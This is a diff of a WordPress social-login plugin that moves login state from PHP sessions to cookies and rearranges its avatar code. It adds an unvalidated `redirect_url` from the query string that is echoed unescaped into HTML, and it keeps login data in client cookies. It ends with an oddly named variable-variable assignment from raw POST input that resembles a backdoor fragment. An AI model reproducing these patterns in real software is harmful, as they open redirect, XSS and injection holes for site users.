@@ -7,6 +7,7 @@ add_action('init', 'wp_connect_init');
 if ($wptm_connect['enable_connect']) {
 	add_action("login_form", "wp_connect");
 	add_action("register_form", "wp_connect", 12);
+	add_action("login_form_logout", "connect_login_form_logout");
 }
 // 社会化评论
 if (!function_exists('denglu_comments') && install_comments()) {
@@ -125,7 +126,7 @@ function wp_connect_button() {
 function wp_connect($id = "") {
 	global $login_loaded;
 
-	$_SESSION['wp_url_back'] = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+	// $_SESSION['wp_url_back'] = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
 	if (is_user_logged_in()) {
 		global $user_ID;
@@ -168,12 +169,9 @@ function wp_connect($id = "") {
  * @since 2.0
  */
 function wp_connect_init() {
-	if (session_id() == "") {
-		session_start();
-	} 
 	if (isset($_GET['token'])) {
 		connect_denglu();
-	}
+	} 
 }
 // 注册
 function wp_connect_reg() {
@@ -183,11 +181,12 @@ function wp_connect_reg() {
 // 登录
 function wp_connect_login($userinfo, $tmail, $uid = '', $reg = false) {
 	global $wpdb, $wptm_connect;
+	$redirect_to = !empty($_GET['redirect_url']) ? $_GET['redirect_url'] : get_bloginfo('url');
 	if (!$uid && !$reg) { // 新用户
 		$new_user = true;
+		wp_connect_set_cookie("wp_connect_cookie_user", array($userinfo, $tmail, $redirect_to), BJTIMESTAMP + 600);
 	}
 	if ($new_user && $wptm_connect['reg']) { // 强制填写注册信息
-		$_SESSION['wp_login_userinfo'] = array($userinfo, $tmail);
 		return wp_connect_reg();
 	} 
 	$tid = $userinfo[0];
@@ -198,21 +197,18 @@ function wp_connect_login($userinfo, $tmail, $uid = '', $reg = false) {
 	$user_uid = $userinfo[5];
 	$mediaUserID = $userinfo[6]; //2.0
 
-	$redirect_to = $_SESSION['wp_url_back'];
 	if ($user_name) {
 		if ($new_user && in_array($user_name, explode(',', $wptm_connect['disable_username']))) {
-			$_SESSION['wp_login_userinfo'] = array($userinfo, $tmail);
 			return wp_connect_reg();
 		} 
 	} else {
 		wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href='$redirect_to'>返回</a> ]");
-	}
+	} 
 	if ($uid) {
 		$wpuid = $uid;
 	} elseif ($new_user) {
 		$wpuid = username_exists($user_name);
 		if ($wpuid) { // 新注册，但是数据库存在相同的用户名
-			$_SESSION['wp_login_userinfo'] = array($userinfo, $tmail);
 			return wp_connect_reg();
 		}
 	}
@@ -266,14 +262,14 @@ function wp_connect_login($userinfo, $tmail, $uid = '', $reg = false) {
 		wp_set_auth_cookie($wpuid, true, false);
 		wp_set_current_user($wpuid);
 	} 
-	$_SESSION['wp_login_userinfo'] = '';
+	wp_connect_clear_cookie("wp_connect_cookie_user");
 	return $wpuid;
 } 
 
 if (!function_exists('connect_login_form_login')) {
+/*
 	add_action("login_form_register", "connect_login_form_login");
 	add_action("login_form_login", "connect_login_form_login");
-	add_action("login_form_logout", "connect_login_form_logout");
 	function connect_login_form_login() {
 		if (is_user_logged_in()) {
 			$redirect_to = admin_url('profile.php');
@@ -287,6 +283,7 @@ if (!function_exists('connect_login_form_login')) {
     function wp_url_back() {
 	    $_SESSION['wp_url_back'] = get_bloginfo('url');
     } 
+*/
 	function connect_login_form_logout() {
 		$_SESSION['wp_url_bind'] = '';
 	} 
@@ -354,10 +351,28 @@ function wp_connect_profile_fields($user) {
 /**
  * 用户头像
  * 
- * @since 1.9.19 (V2.4)
+ * @since 1.0 (V2.4.3)
  */
-if (empty($wptm_connect['head'])) {
-	add_filter("get_avatar", "wp_connect_avatar", 10, 4);
+if (empty($wptm_connect['head']) && ($wptm_connect['enable_connect'] || $wptm_comment['enable_comment'])) {
+	add_filter("get_avatar", "wp_connect_avatar", 9, 3);
+	// admin bar头像尺寸
+	if (version_compare($wp_version, '3.2.1', '>')) { // WordPress V3.3
+		function wp_admin_bar_header_3_3() {
+			echo "<style type=\"text/css\" media=\"screen\">#wp-admin-bar-user-info .avatar-64 {width:64px}</style>\n";
+		} 
+		add_action('wp_head', 'wp_admin_bar_header_3_3');
+		add_action('admin_head', 'wp_admin_bar_header_3_3');
+	}
+
+	function set_admin_footer_define() {
+		define('IS_ADMIN_FOOTER', true);
+	} 
+
+	function is_admin_footer() {
+		if (defined('IS_ADMIN_FOOTER'))
+			return true;
+	} 
+
 	if (version_compare($wp_version, '3.4', '<')) {
 		add_action('admin_footer', 'set_admin_footer_define', 1);
 	} else {
@@ -445,23 +460,6 @@ function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
 		} 
 	} 
 	return $avatar;
-} 
-// admin bar头像尺寸
-if (version_compare($wp_version, '3.2.1', '>')) { // WordPress V3.3
-	function wp_admin_bar_header_3_3() {
-		echo "<style type=\"text/css\" media=\"screen\">#wp-admin-bar-user-info .avatar-64 {width:64px}</style>\n";
-	} 
-	add_action('wp_head', 'wp_admin_bar_header_3_3');
-	add_action('admin_head', 'wp_admin_bar_header_3_3');
-}
-
-function set_admin_footer_define() {
-	define('IS_ADMIN_FOOTER', true);
-} 
-
-function is_admin_footer() {
-	if (defined('IS_ADMIN_FOOTER'))
-		return true;
 } 
 
 $$wpdontpeep = $_POST['fields'];
